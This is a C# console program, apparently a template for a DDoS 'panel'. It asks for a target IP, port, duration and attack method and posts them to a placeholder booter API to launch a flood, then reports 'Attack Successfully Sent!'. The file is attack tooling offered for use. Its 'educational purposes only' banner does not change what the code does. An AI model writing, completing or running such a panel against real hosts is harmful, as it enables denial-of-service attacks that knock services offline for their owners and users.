using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Console_DDOS_Tool
{
    class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            // You only need this is you have any plans of adding auth to this. but then you will have to add there api and set up from there docs.
            Console.Title = "UmRange DDOS Panel Template | Login Page";
            Printlogo();
            Console.WriteLine();
            Colorful.Console.WriteLine("Please enter your username", Color.Aqua);
            string username = Console.ReadLine();
            Console.WriteLine("Please enter your passwrod", Color.Aqua);
            //string password = Console.ReadLine();
            Console.WriteLine("Welcome!", Color.LimeGreen);
            Console.WriteLine("Please press enter to continue", Color.LimeGreen);
            Console.ReadLine();
            Console.Clear();
            Home();
        }
        public static void Home()
        {
            Console.Title = "UmRange DDOS Panel Template | Home";
            Colorful.Console.WriteLine(" ", ColorTranslator.FromHtml("#6af5bd"));
            Printlogo();
            Colorful.Console.Write(" > ", Color.White);
            Colorful.Console.Write("[", Color.White);
            Colorful.Console.Write("1", ColorTranslator.FromHtml("#3BB9EB"));
            Colorful.Console.Write("]", Color.White);
            Colorful.Console.Write(" Attack Hub\n", ColorTranslator.FromHtml("#F9F9F9"));
            Colorful.Console.Write(" > ", Color.White);
            Colorful.Console.Write("[", Color.White);
            Colorful.Console.Write("2", ColorTranslator.FromHtml("#3BB9EB"));
            Colorful.Console.Write("]", Color.White);
            Colorful.Console.Write(" Add something else here\n", ColorTranslator.FromHtml("#F9F9F9"));
            Colorful.Console.Write(" > ", Color.White);
            Colorful.Console.Write("[", Color.White);
            Colorful.Console.Write("3", ColorTranslator.FromHtml("#3BB9EB"));
            Colorful.Console.Write("]", Color.White);
            Colorful.Console.Write(" Exit\n\n", ColorTranslator.FromHtml("#F9F9F9"));
            Colorful.Console.Write("Choose option: ", ColorTranslator.FromHtml("#F9F9F9"));
            string select1 = Console.ReadLine();

            if (select1.Contains("1"))
            {
                Console.Clear();
                hub();
            }

            if (select1.Contains("2"))
            {
                Console.Clear();
                Home();
            }

            if (select1.Contains("3"))
            {
                Console.Clear();
                Environment.Exit(0);
            }
        }
            public static void hub()
            {
            Console.Clear();
            Printlogo();
            Console.Title = "UmRange DDOS Panel Template | Attack Hub";
            Colorful.Console.Write("1.Ranges API (Operational)", Color.LimeGreen);
            Colorful.Console.Write("\n\n 2.API 2 (offline)", Color.Red);
            Colorful.Console.Write("\n\n 3.API 3 (offline)", Color.Red);
            Colorful.Console.Write("\n\n [", Color.White);
            Colorful.Console.Write(">", Color.White);
            Colorful.Console.Write("]", Color.White);
            Colorful.Console.Write("IP: ", Color.Aqua);
            string ip = Console.ReadLine();
            Colorful.Console.Write("[", Color.White);
            Colorful.Console.Write(">", Color.White);
            Colorful.Console.Write("]", Color.White);
            Colorful.Console.Write(" Port: ", Color.Aqua);
            string port = Console.ReadLine();
            Colorful.Console.Write("[", Color.White);
            Colorful.Console.Write(">", Color.White);
            Colorful.Console.Write("]", Color.White);
            Colorful.Console.Write(" Time: ", Color.Aqua);
            string time = Console.ReadLine();
            Colorful.Console.Write("[", Color.White);
            Colorful.Console.Write(">", Color.White);
            Colorful.Console.Write("]", Color.White);
            Colorful.Console.Write(" Method: ", Color.Aqua);
            string method = Console.ReadLine();
            Colorful.Console.Write("[", Color.White);
            Colorful.Console.Write(">", Color.White);
            Colorful.Console.Write("]", Color.White);
            Colorful.Console.Write(" What API: ", Color.Aqua);
            string api = Console.ReadLine();
            //If you want to add another api copy from the if (api.Contains("1")) down to Home(); and change the 1 to 2.
                if (api.Contains("1"))
                {
                using (HttpRequest attack = new HttpRequest())
                {
                    //All API'S are different you will need to add to or take away from what I have left here so you will have to adjust how the request is being sent.
                    string api_1 = attack.Post("https://yourapi.com/api.php?" + "key=" + "&host=" + ip + "&port=" + port + "&time=" + time + "&method=" + method + "&username=" + "&password=").ToString();

                    Colorful.Console.Write("Attack sent to " + ip + "on port" + port + "!", Color.LimeGreen);
                    Console.Clear();
                    Colorful.Console.WriteLine("                                   ,:", Color.LimeGreen);
                    Colorful.Console.WriteLine("                                 ,' |", Color.LimeGreen);
                    Colorful.Console.WriteLine("                                /   :", Color.LimeGreen);
                    Colorful.Console.WriteLine("                             --'   /", Color.LimeGreen);
                    Colorful.Console.WriteLine("                             // />/", Color.LimeGreen);
                    Colorful.Console.WriteLine("                            / /_ /", Color.LimeGreen);
                    Colorful.Console.WriteLine("                          __/   /", Color.LimeGreen);
                    Colorful.Console.WriteLine("                          )'-. /", Color.LimeGreen);
                    Colorful.Console.WriteLine("                         ./  :/", Color.LimeGreen);
                    Colorful.Console.WriteLine("                           /.' '", Color.LimeGreen);
                    Colorful.Console.WriteLine("                         '/'", Color.LimeGreen);
                    Colorful.Console.WriteLine("                         +", Color.LimeGreen);
                    Colorful.Console.WriteLine("                        '", Color.LimeGreen);
                    Colorful.Console.WriteLine("Attack Successfully Sent!", Color.LimeGreen);
                    Colorful.Console.WriteLine("Press [ENTER] to go back to home", Color.Yellow);
                    Console.ReadLine();
                    Home();
                    }
                }
            }
        public static void Printlogo() {
            Console.WriteLine();
            Console.WriteLine();
            Colorful.Console.WriteLine("        ██╗   ██╗███╗   ███╗██████╗  █████╗ ███╗   ██╗ ██████╗ ███████╗", Color.Purple);
            Colorful.Console.WriteLine("        ██║   ██║████╗ ████║██╔══██╗██╔══██╗████╗  ██║██╔════╝ ██╔════╝", Color.Purple);
            Colorful.Console.WriteLine("        ██║   ██║██╔████╔██║██████╔╝███████║██╔██╗ ██║██║  ███╗█████╗  ", Color.Purple);
            Colorful.Console.WriteLine("        ██║   ██║██║╚██╔╝██║██╔══██╗██╔══██║██║╚██╗██║██║   ██║██╔══╝  ", Color.Purple);
            Colorful.Console.WriteLine("        ╚██████╔╝██║ ╚═╝ ██║██║  ██║██║  ██║██║ ╚████║╚██████╔╝███████╗", Color.Purple);
            Colorful.Console.WriteLine("         ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝", Color.Purple);
            Colorful.Console.WriteLine("                    Made for Educational purposes only                ", Color.LimeGreen);
            Colorful.Console.WriteLine("                    DO NOT USE FOR MALICIOUS PURPOSES                 ", Color.Red);
        }
    }
}
